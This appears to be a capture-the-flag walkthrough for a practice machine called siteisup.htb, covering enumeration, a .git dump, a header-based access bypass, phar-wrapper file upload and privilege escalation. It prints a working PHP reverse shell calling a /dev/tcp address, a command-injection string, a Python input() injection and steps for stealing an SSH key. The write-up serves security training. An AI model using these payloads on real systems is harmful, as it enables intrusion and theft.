1 - Enumerate ports

2 - Enumerate info about the website with whatweb

3 - Try to enumerate useful directories with [Nmap](<General Info/Tools/Enumeracion/Nmap.md>) using [http-enum](<General Info/Tools/NSE scripts/http-enum.md>)

4 - Once you've discovered the hidden `/dev` directory you can run the http nse script again with `--script-args http-enum.basepath={path}` giving the /dev as value in order to get additional directories in the specified path

5 - Now that you know that the server has the `/dev/.git` folder you can use the tool [Git-dumper](<General Info/Tools/Git-dumper.md>) to obtain the whole directory into your current folder (Just like a git clone does)

6 - Once you've done all the enumeration you can go into the page and try some attacks on it. A common attack that will come to our mind when we see the page with the funcionality present in it is, at least in order to enumerate a little more, put our ip in the text box and send the request while we're listening at it with [Netcat](<General Info/Tools/Netcat.md>). Another way to take advantadge of the app is by trying to exploit an [OS Command Execution](<General Info/Tecnologias Web/Ataques/OS Command Execution.md>) if you think that maybe the command used to get the source code of the page is [Curl](<General Info/Linux commands/Curl.md>), an easy way to try it could be `http://{IP}; whoami`

7 - After trying some attacks you can go on and enumerate subdomains with [Wfuzz](<General Info/Tools/Enumeracion/Wfuzz.md>) or [GoBuster](<General Info/Tools/Enumeracion/Gobuster.md>). You'll find the dev.siteisup.htb.

8 - Now, you'll see that when you try to enter into the site with the dev subdomain you'll get the forbidden message, this error can be bypassed by adding the header `Special-Dev: only4dev`. This can be done by adding a `Request header` in the Match and Replace section.

9 - Once you've entered into the website you'll see an upload section and, reading the code, you can notice that if you add the `page` parameter in the url you can request the page given. In order to exploit this you can combine the upload section and the page parameter to, using the zip php wrapper, execute a php payload inside a compressed file.

10 - The way to exploit the website is, firstly, upload a compressed file with a random extension like `.hello` that contains a php reverse shell like the one in [Common payloads](<General Info/Payload/Common payloads.md>), secondly send a request to the /upload/{FOLDER}/{COMPRESSED FILE}/{PHP-FILE} with the parameter ?page, this ends like: {IP}/?page=phar://upload/{FOLDER}/{COMPRESSED_FILE}/{PHP_FILE} (You've to keep in mind that the php file of the index page adds the .php extension, so, you don't need to add .php to the {PHP_FILE}), and lastly, obtain the shell in a netcat server. (Important note: look at the usage of the [phar](<General Info/Tecnologias Web/PHP Wrappers/phar.md>) wrapper in this machine)
	10.1 - The previous way to exploit needs to know the blacklisted php expressions in order to make a php payload with an omitted non-blacklisted function. In this machine functions like system(), shell_exec() and exec() are prohibited, so, in order to exploit this we will use the tool [Dfunc Bypasser](<General Info/Tools/Dfunc Bypasser.md>) to automate the search of a legal function to get into the machine
	10.2 - The named tool requires us to execute the function phpinfo() in order to get a info disclousure of all the blacklist in the server
	10.3 - Important note about the app: You've to specify the headers used by the app to bypass the fobidden message, this can be done by adding `headers = {'Special-Dev': 'only4dev'}` in all the requests module calls
	10.4 - The reason behind uploading a compressed file is that, because the app tries to delete the file, you've to give the app something non-readable to make the app crash and skip the step of removing the file from /uploads

11 - Now that you know that the proc_open function is open to use you can try to upload a reverse-shell using this function. eg.:

```
<?php
	$descriptorspec = array(
   		0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   		1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   		2 => array("pipe", "w")   // stderr is a pipe that the child will write to
	);
	
	$shell = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.11/443 0>&1'";
	
	$process = proc_open($shell, $descriptorspec, $pipes);
?>
```

12 - Once you've done everything listed above, you are able to start pivoting and doing privilege escalation. The first thing you've to do is try to enumerate files with SUID in order to change your user (www-data) to developer. The way to do the pivoting is exploit the file stored in /home/developer/dev. This file can be exploited because the binary executes a python2 file that has the input() function, function that executes the code entered instead of only reading it. The particular way to exploit this is `__import__('os').system('bash -p')`.

13 - Now that you're inside of the developer user you can steal the id_rsa file in order to use it to gain the gid of the previously named user via ssh. In order to do this you've to cat out the file, copy the content, paste it in a file in your computer, use it along with the [SSH](<General Info/Tools/SSH.md>) tool: `ssh -i {FILE} {USER}@{IP}`

14 - Now you only have to gain root access, this can be done by, firstly enumerating with `sudo -l` and once you've seen the `easy-install` exploiting it with [GTFOBins](<General Info/Useful Pages/GTFOBins.md>). You've to look for the binary and look for how to exploit it with the SUID permisson